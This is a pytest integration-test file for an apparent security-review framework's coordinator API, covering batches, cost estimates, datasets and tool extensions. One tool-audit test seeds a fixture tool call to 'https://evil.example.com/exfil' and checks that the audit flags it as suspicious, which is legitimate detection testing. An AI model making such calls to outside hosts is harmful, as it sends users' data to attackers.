"""Integration tests for the FastAPI coordinator API.

Tests all endpoints that don't require a live K8s cluster by monkey-patching
the global ``coordinator`` object with a real BatchCoordinator backed by a
temp SQLite DB and temp storage root.
"""

from __future__ import annotations

import json
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
from fastapi.testclient import TestClient

import sec_review_framework.coordinator as coord_module
from sec_review_framework.coordinator import (
    AUDIT_URL_CHECK_EXEMPT_PREFIXES,
    BatchCoordinator,
    BatchCostTracker,
    app,
)
from sec_review_framework.cost.calculator import CostCalculator, ModelPricing
from sec_review_framework.data.experiment import (
    ExperimentMatrix,
    ReviewProfileName,
    RunResult,
    RunStatus,
    StrategyName,
    ToolExtension,
    ToolVariant,
    VerificationVariant,
)
from sec_review_framework.db import Database
from sec_review_framework.reporting.markdown import MarkdownReportGenerator


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _make_coordinator(tmp_path: Path, db: Database) -> BatchCoordinator:
    """Build a BatchCoordinator wired to a temp DB and storage root."""
    cost_calc = CostCalculator(
        pricing={
            "gpt-4o": ModelPricing(input_per_million=5.0, output_per_million=15.0),
            "claude-opus-4": ModelPricing(input_per_million=15.0, output_per_million=75.0),
        }
    )
    config_dir = tmp_path / "config"
    config_dir.mkdir(parents=True, exist_ok=True)
    return BatchCoordinator(
        k8s_client=None,
        storage_root=tmp_path / "storage",
        concurrency_caps={},
        worker_image="worker:latest",
        namespace="default",
        db=db,
        reporter=MarkdownReportGenerator(),
        cost_calculator=cost_calc,
        config_dir=config_dir,
        default_cap=4,
    )


def _minimal_matrix() -> dict:
    """Minimal ExperimentMatrix payload for API calls."""
    return {
        "batch_id": "test-batch",
        "dataset_name": "test-dataset",
        "dataset_version": "1.0.0",
        "model_ids": ["gpt-4o"],
        "strategies": ["single_agent"],
        "tool_variants": ["with_tools"],
        "review_profiles": ["default"],
        "verification_variants": ["none"],
        "parallel_modes": [False],
    }


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
async def coordinator_client(tmp_path: Path):
    """TestClient with the global coordinator patched to a temp instance."""
    db = Database(tmp_path / "test.db")
    await db.init()

    c = _make_coordinator(tmp_path, db)

    # Patch the module-level global so app endpoints use our test coordinator.
    with patch.object(coord_module, "coordinator", c):
        # Skip reconcile (which tries to read from K8s/DB) by patching it too.
        with patch.object(c, "reconcile", return_value=None):
            with TestClient(app, raise_server_exceptions=True) as client:
                yield client, c, tmp_path


# ---------------------------------------------------------------------------
# Health
# ---------------------------------------------------------------------------

def test_health_returns_ok(coordinator_client):
    client, *_ = coordinator_client
    resp = client.get("/health")
    assert resp.status_code == 200
    assert resp.json() == {"status": "ok"}


# ---------------------------------------------------------------------------
# GET /batches — empty initially
# ---------------------------------------------------------------------------

def test_list_batches_empty(coordinator_client):
    client, *_ = coordinator_client
    resp = client.get("/batches")
    assert resp.status_code == 200
    assert resp.json() == []


# ---------------------------------------------------------------------------
# GET /strategies
# ---------------------------------------------------------------------------

def test_list_strategies(coordinator_client):
    client, *_ = coordinator_client
    resp = client.get("/strategies")
    assert resp.status_code == 200
    data = resp.json()
    assert isinstance(data, list)
    names = {s["name"] for s in data}
    # All StrategyName enum values should be present
    for strategy in StrategyName:
        assert strategy.value in names, f"{strategy.value} missing from /strategies"


def test_list_strategies_has_description(coordinator_client):
    client, *_ = coordinator_client
    data = client.get("/strategies").json()
    for item in data:
        assert "name" in item
        assert "description" in item


# ---------------------------------------------------------------------------
# GET /profiles
# ---------------------------------------------------------------------------

def test_list_profiles(coordinator_client):
    client, *_ = coordinator_client
    resp = client.get("/profiles")
    assert resp.status_code == 200
    data = resp.json()
    assert isinstance(data, list)
    assert len(data) > 0


def test_list_profiles_has_expected_fields(coordinator_client):
    client, *_ = coordinator_client
    data = client.get("/profiles").json()
    for item in data:
        assert "name" in item
        assert "description" in item


def test_list_profiles_includes_default(coordinator_client):
    client, *_ = coordinator_client
    data = client.get("/profiles").json()
    names = [item["name"] for item in data]
    assert "default" in names


# ---------------------------------------------------------------------------
# GET /models — returns list (may be empty if no config file)
# ---------------------------------------------------------------------------

def test_list_models(coordinator_client):
    client, *_ = coordinator_client
    resp = client.get("/models")
    assert resp.status_code == 200
    assert isinstance(resp.json(), list)


# ---------------------------------------------------------------------------
# POST /batches/estimate
# ---------------------------------------------------------------------------

def test_estimate_batch_returns_cost(coordinator_client):
    client, *_ = coordinator_client
    payload = {
        "matrix": _minimal_matrix(),
        "target_kloc": 10.0,
    }
    resp = client.post("/batches/estimate", json=payload)
    assert resp.status_code == 200
    data = resp.json()
    assert "total_runs" in data
    assert "estimated_cost_usd" in data
    assert "by_model" in data
    assert "warning" in data
    assert data["total_runs"] == 1  # 1 model * 1 strategy * 1 tool * 1 profile * 1 verif


def test_estimate_batch_cost_is_positive_for_known_model(coordinator_client):
    client, *_ = coordinator_client
    payload = {
        "matrix": _minimal_matrix(),
        "target_kloc": 5.0,
    }
    data = client.post("/batches/estimate", json=payload).json()
    assert data["estimated_cost_usd"] >= 0.0
    assert "gpt-4o" in data["by_model"]


def test_estimate_batch_larger_matrix(coordinator_client):
    client, *_ = coordinator_client
    payload = {
        "matrix": {
            **_minimal_matrix(),
            "batch_id": "big-batch",
            "model_ids": ["gpt-4o", "claude-opus-4"],
            "strategies": ["single_agent", "per_file"],
        },
        "target_kloc": 2.0,
    }
    data = client.post("/batches/estimate", json=payload).json()
    # 2 models * 2 strategies = 4 runs (1 tool * 1 profile * 1 verif)
    assert data["total_runs"] == 4


# ---------------------------------------------------------------------------
# GET /batches/{id} — non-existent → 404
# ---------------------------------------------------------------------------

def test_get_nonexistent_batch_returns_404(coordinator_client):
    client, *_ = coordinator_client
    resp = client.get("/batches/does-not-exist")
    assert resp.status_code == 404


# ---------------------------------------------------------------------------
# GET /batches/{id}/runs — non-existent → empty list (no rows)
# ---------------------------------------------------------------------------

def test_list_runs_nonexistent_batch_returns_empty(coordinator_client):
    client, *_ = coordinator_client
    resp = client.get("/batches/does-not-exist/runs")
    assert resp.status_code == 200
    assert resp.json() == []


# ---------------------------------------------------------------------------
# GET /batches/{id}/runs/{run_id} — non-existent → 404
# ---------------------------------------------------------------------------

def test_get_nonexistent_run_returns_404(coordinator_client):
    client, *_ = coordinator_client
    resp = client.get("/batches/does-not-exist/runs/also-missing")
    assert resp.status_code == 404


# ---------------------------------------------------------------------------
# GET /datasets — empty initially
# ---------------------------------------------------------------------------

def test_list_datasets_empty(coordinator_client):
    client, _, tmp_path = coordinator_client
    resp = client.get("/datasets")
    assert resp.status_code == 200
    assert isinstance(resp.json(), list)


def test_list_datasets_returns_dataset_when_present(coordinator_client):
    client, _, tmp_path = coordinator_client
    storage = tmp_path / "storage"
    ds_dir = storage / "datasets" / "my-dataset"
    ds_dir.mkdir(parents=True)
    (ds_dir / "labels.json").write_text(json.dumps([{"id": "lbl-1"}]))

    resp = client.get("/datasets")
    assert resp.status_code == 200
    names = [d["name"] for d in resp.json()]
    assert "my-dataset" in names


# ---------------------------------------------------------------------------
# GET /datasets/{name}/labels
# ---------------------------------------------------------------------------

def test_get_labels_empty_for_unknown_dataset(coordinator_client):
    client, *_ = coordinator_client
    resp = client.get("/datasets/no-such-dataset/labels")
    assert resp.status_code == 200
    assert resp.json() == []


def test_get_labels_returns_labels_when_present(coordinator_client):
    client, _, tmp_path = coordinator_client
    storage = tmp_path / "storage"
    ds_dir = storage / "datasets" / "vuln-dataset"
    ds_dir.mkdir(parents=True)
    labels = [{"id": "lbl-a", "file_path": "main.py"}]
    (ds_dir / "labels.json").write_text(json.dumps(labels))

    resp = client.get("/datasets/vuln-dataset/labels")
    assert resp.status_code == 200
    data = resp.json()
    assert len(data) == 1
    assert data[0]["id"] == "lbl-a"


# ---------------------------------------------------------------------------
# POST /feedback/compare
# ---------------------------------------------------------------------------

def test_feedback_compare_with_empty_batches(coordinator_client):
    """compare_batches returns a valid structure even when both batches are empty."""
    client, *_ = coordinator_client
    resp = client.post(
        "/feedback/compare",
        json={"batch_a_id": "batch-x", "batch_b_id": "batch-y"},
    )
    assert resp.status_code == 200
    data = resp.json()
    assert "batch_a_id" in data
    assert "batch_b_id" in data
    assert "metric_deltas" in data
    assert "persistent_false_positives" in data


# ---------------------------------------------------------------------------
# GET /templates — returns list (may be empty)
# ---------------------------------------------------------------------------

def test_list_templates(coordinator_client):
    client, *_ = coordinator_client
    resp = client.get("/templates")
    assert resp.status_code == 200
    assert isinstance(resp.json(), list)


# ---------------------------------------------------------------------------
# GET /batches/{id}/results — 404 if report file missing
# ---------------------------------------------------------------------------

def test_get_results_json_404_when_not_finalized(coordinator_client):
    client, *_ = coordinator_client
    resp = client.get("/batches/missing-batch/results")
    assert resp.status_code == 404


def test_get_results_markdown_404_when_not_finalized(coordinator_client):
    client, *_ = coordinator_client
    resp = client.get("/batches/missing-batch/results/markdown")
    assert resp.status_code == 404


# ---------------------------------------------------------------------------
# POST /batches — submit creates batch in DB (K8s job skipped because k8s=None)
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_submit_batch_creates_db_record(tmp_path: Path):
    db = Database(tmp_path / "test.db")
    await db.init()
    c = _make_coordinator(tmp_path, db)

    matrix = ExperimentMatrix(
        batch_id="submit-test",
        dataset_name="ds",
        dataset_version="1.0",
        model_ids=["gpt-4o"],
        strategies=[StrategyName.SINGLE_AGENT],
        tool_variants=[ToolVariant.WITH_TOOLS],
        review_profiles=[ReviewProfileName.DEFAULT],
        verification_variants=[VerificationVariant.NONE],
        parallel_modes=[False],
    )

    batch_id = await c.submit_batch(matrix)
    assert batch_id == "submit-test"

    batch_row = await db.get_batch("submit-test")
    assert batch_row is not None
    assert batch_row["total_runs"] == 1

    runs = await db.list_runs("submit-test")
    assert len(runs) == 1


# ---------------------------------------------------------------------------
# Batch Frontend Contract — enforce shape of serialized batches
# ---------------------------------------------------------------------------

# Expected frontend Batch interface from frontend/src/api/client.ts:7-20
FRONTEND_BATCH_REQUIRED_KEYS = {
    "batch_id",
    "status",
    "dataset",
    "created_at",
    "total_runs",
    "completed_runs",
    "running_runs",
    "pending_runs",
    "failed_runs",
    "total_cost_usd",
}

FRONTEND_BATCH_OPTIONAL_KEYS = {
    "completed_at",
    "spend_cap_usd",
}

ALLOWED_STATUS_VALUES = {"pending", "running", "completed", "failed", "cancelled"}


class TestBatchFrontendContract:
    """Test that batch endpoints return correct shape for frontend consumption."""

    @pytest.mark.asyncio
    async def test_list_batches_contract(self, coordinator_client):
        """GET /batches returns array of batches matching frontend Batch interface."""
        client, c, tmp_path = coordinator_client

        # Submit a batch
        resp = client.post("/batches", json=_minimal_matrix())
        assert resp.status_code == 201

        # List batches
        resp = client.get("/batches")
        assert resp.status_code == 200
        batches = resp.json()
        assert isinstance(batches, list)
        assert len(batches) > 0

        # Check first batch conforms to frontend contract
        batch = batches[0]
        self._assert_batch_contract(batch)

    @pytest.mark.asyncio
    async def test_get_batch_detail_contract(self, coordinator_client):
        """GET /batches/{id} returns single batch matching frontend Batch interface."""
        client, c, tmp_path = coordinator_client

        # Submit a batch
        resp = client.post("/batches", json=_minimal_matrix())
        assert resp.status_code == 201
        batch_id = resp.json()["batch_id"]

        # Get batch detail
        resp = client.get(f"/batches/{batch_id}")
        assert resp.status_code == 200
        batch = resp.json()

        # Check batch conforms to frontend contract
        self._assert_batch_contract(batch)

    def _assert_batch_contract(self, batch: dict) -> None:
        """Assert batch dict has exactly the keys and types the frontend expects."""
        # Check all required keys present
        batch_keys = set(batch.keys())
        missing = FRONTEND_BATCH_REQUIRED_KEYS - batch_keys
        assert not missing, f"Missing required keys: {missing}"

        # Check no unexpected keys (only required + optional allowed)
        allowed_keys = FRONTEND_BATCH_REQUIRED_KEYS | FRONTEND_BATCH_OPTIONAL_KEYS
        unexpected = batch_keys - allowed_keys
        assert not unexpected, f"Unexpected keys: {unexpected}"

        # Check types
        assert isinstance(batch["batch_id"], str)
        assert batch["status"] in ALLOWED_STATUS_VALUES
        assert isinstance(batch["dataset"], str)
        assert isinstance(batch["created_at"], str)
        assert isinstance(batch["total_runs"], int)
        assert isinstance(batch["completed_runs"], int)
        assert isinstance(batch["running_runs"], int)
        assert isinstance(batch["pending_runs"], int)
        assert isinstance(batch["failed_runs"], int)
        assert isinstance(batch["total_cost_usd"], (int, float))

        # Optional fields may be present as null or their type
        if batch.get("completed_at") is not None:
            assert isinstance(batch["completed_at"], str)
        if batch.get("spend_cap_usd") is not None:
            assert isinstance(batch["spend_cap_usd"], (int, float))


# ---------------------------------------------------------------------------
# GET /batches/{id}/findings/search — no crash when batch has no results
# ---------------------------------------------------------------------------

def test_search_findings_empty_batch(coordinator_client):
    client, *_ = coordinator_client
    resp = client.get("/batches/empty-batch/findings/search?q=injection")
    assert resp.status_code == 200
    assert resp.json() == []


# ---------------------------------------------------------------------------
# GET /batches/{id}/runs/{run_id}/tool-audit — returns empty audit when no file
# ---------------------------------------------------------------------------

def test_tool_audit_no_file(coordinator_client):
    client, *_ = coordinator_client
    resp = client.get("/batches/b/runs/r/tool-audit")
    assert resp.status_code == 200
    data = resp.json()
    assert data["counts_by_tool"] == {}
    assert data["suspicious_calls"] == []


# ---------------------------------------------------------------------------
# GET /tool-extensions
# ---------------------------------------------------------------------------

def test_list_tool_extensions_returns_list(coordinator_client):
    client, *_ = coordinator_client
    resp = client.get("/tool-extensions")
    assert resp.status_code == 200
    data = resp.json()
    assert isinstance(data, list)


def test_list_tool_extensions_has_all_enum_members(coordinator_client):
    client, *_ = coordinator_client
    data = client.get("/tool-extensions").json()
    keys = {item["key"] for item in data}
    for ext in ToolExtension:
        assert ext.value in keys, f"{ext.value} missing from /tool-extensions"


def test_list_tool_extensions_correct_shape(coordinator_client):
    client, *_ = coordinator_client
    data = client.get("/tool-extensions").json()
    for item in data:
        assert "key" in item
        assert "label" in item
        assert "available" in item
        assert isinstance(item["key"], str)
        assert isinstance(item["label"], str)
        assert isinstance(item["available"], bool)


def test_list_tool_extensions_tree_sitter_label(coordinator_client):
    client, *_ = coordinator_client
    data = client.get("/tool-extensions").json()
    by_key = {item["key"]: item for item in data}
    assert by_key["tree_sitter"]["label"] == "Tree-sitter"
    assert by_key["lsp"]["label"] == "LSP"
    assert by_key["devdocs"]["label"] == "DevDocs"


def test_list_tool_extensions_default_not_available(coordinator_client):
    """Without env vars set, all extensions should report available=False."""
    client, *_ = coordinator_client
    data = client.get("/tool-extensions").json()
    for item in data:
        assert item["available"] is False, f"{item['key']} should be unavailable by default"


def test_list_tool_extensions_available_when_env_set(coordinator_client, monkeypatch):
    """With TOOL_EXT_LSP_AVAILABLE=true, lsp should report available=True."""
    monkeypatch.setenv("TOOL_EXT_LSP_AVAILABLE", "true")
    client, *_ = coordinator_client
    data = client.get("/tool-extensions").json()
    by_key = {item["key"]: item for item in data}
    assert by_key["lsp"]["available"] is True
    assert by_key["tree_sitter"]["available"] is False


def test_list_tool_extensions_stable_order(coordinator_client):
    """Order should match ToolExtension enum declaration order."""
    client, *_ = coordinator_client
    data = client.get("/tool-extensions").json()
    keys = [item["key"] for item in data]
    expected = [ext.value for ext in ToolExtension]
    assert keys == expected


# ---------------------------------------------------------------------------
# Audit URL whitelist — AUDIT_URL_CHECK_EXEMPT_PREFIXES
# ---------------------------------------------------------------------------

def test_audit_exempt_prefixes_constant_exists():
    assert "doc_" in AUDIT_URL_CHECK_EXEMPT_PREFIXES
    assert "ts_" in AUDIT_URL_CHECK_EXEMPT_PREFIXES
    assert "lsp_" in AUDIT_URL_CHECK_EXEMPT_PREFIXES


def test_audit_doc_tool_with_url_not_flagged(coordinator_client, tmp_path):
    """doc_ tools with URL-looking paths must not be flagged as suspicious."""
    import json as _json
    client, c, tp = coordinator_client
    storage = tp / "storage"
    run_dir = storage / "outputs" / "batch-x" / "run-1"
    run_dir.mkdir(parents=True)
    tool_calls = run_dir / "tool_calls.jsonl"
    tool_calls.write_text(
        _json.dumps({
            "tool_name": "doc_fetch",
            "inputs": {"path": "library/urllib.request#urllib.request.urlopen"},
        }) + "\n"
    )

    resp = client.get("/batches/batch-x/runs/run-1/tool-audit")
    assert resp.status_code == 200
    data = resp.json()
    assert data["suspicious_calls"] == []


def test_audit_unknown_tool_with_url_flagged(coordinator_client, tmp_path):
    """Non-exempt tools with https:// in inputs must be flagged."""
    import json as _json
    client, c, tp = coordinator_client
    storage = tp / "storage"
    run_dir = storage / "outputs" / "batch-y" / "run-2"
    run_dir.mkdir(parents=True)
    tool_calls = run_dir / "tool_calls.jsonl"
    tool_calls.write_text(
        _json.dumps({
            "tool_name": "fetch_something",
            "inputs": {"url": "https://evil.example.com/exfil"},
        }) + "\n"
    )

    resp = client.get("/batches/batch-y/runs/run-2/tool-audit")
    assert resp.status_code == 200
    data = resp.json()
    assert len(data["suspicious_calls"]) == 1
    assert data["suspicious_calls"][0]["tool_name"] == "fetch_something"
